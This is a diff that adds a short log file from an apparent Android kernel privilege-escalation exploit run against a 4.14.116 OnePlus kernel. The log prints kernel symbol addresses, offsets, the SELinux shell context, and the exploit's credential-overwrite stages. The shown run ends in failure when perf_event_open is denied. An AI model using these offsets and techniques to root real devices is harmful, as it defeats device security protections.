@@ -1,0 +1,17 @@
+[*] kernel: 4.14.116
+[+] offsets matched: 4.14.116
+[*] init_cred image=ffffff800aebc9a8 alias=ffffff8002ebc9a8
+[+] startup context pid=7299 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=7299 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=7299 label=ghostlock_oneplus slide=pselect main=pselect
+[+] p0 profile pid=7299 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[*] p0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[*] [T+0ms] exploit start
+[*] selinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[*] UMH not available, falling back to W2 cred path
+[*] [T+1280ms] pre-W2 drain
+[!] perf_event_open failed errno=13
+[*] [T+1282ms] perf_find_task done
+[*] perf returned 0, retrying...
+[!] perf_event_open failed errno=13
+[!] Cannot find task_struct (perf blocked by seccomp?)
